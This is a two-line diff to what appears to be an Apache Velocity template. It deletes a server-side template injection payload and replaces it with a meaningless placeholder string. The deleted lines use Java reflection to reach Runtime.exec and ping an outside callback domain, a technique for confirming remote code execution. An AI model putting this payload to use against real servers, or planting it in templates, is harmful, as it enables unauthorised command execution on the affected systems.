@@ -1,2 +1,1 @@
-#set ($exp="test")
-#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("ping a3eefcff.bzn.pw"))
+fjansfsjafnfja
